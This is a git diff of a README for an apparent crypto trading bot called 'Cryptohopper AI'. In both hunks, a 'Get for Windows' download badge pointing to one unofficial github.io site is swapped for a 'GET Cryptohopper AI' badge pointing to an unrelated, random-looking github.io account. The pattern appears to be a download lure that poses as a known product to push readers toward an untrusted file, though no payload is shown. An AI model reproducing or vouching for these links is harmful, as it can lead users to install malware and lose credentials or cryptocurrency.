@@ -5,10 +5,8 @@
 </div>
 <br>
 
-<div align="center">
+[![GET Cryptohopper AI](https://img.shields.io/badge/GET%20%E2%80%94%20Cryptohopper-AI-0078D6?style=for-the-badge&logoColor=white)](https://evioiceviorter.github.io/.github/Cryptohopper-AI)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://cryptohopper-ai-trading-bot.github.io/.github/)
-</div>
 
 ---
 
@@ -24,10 +22,8 @@ Beyond automated execution, Cryptohopper provides consolidated portfolio managem
 <img src="https://cdn.cryptohopper.com/images/documentation/Advanced-dashboard/GIF1AD.gif" width="auto">
 </div>
 
-<div align="center">
+[![GET Cryptohopper AI](https://img.shields.io/badge/GET%20%E2%80%94%20Cryptohopper-AI-0078D6?style=for-the-badge&logoColor=white)](https://evioiceviorter.github.io/.github/Cryptohopper-AI)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://cryptohopper-ai-trading-bot.github.io/.github/)
-</div>
 
 ---
 ### 🎛 Key Features
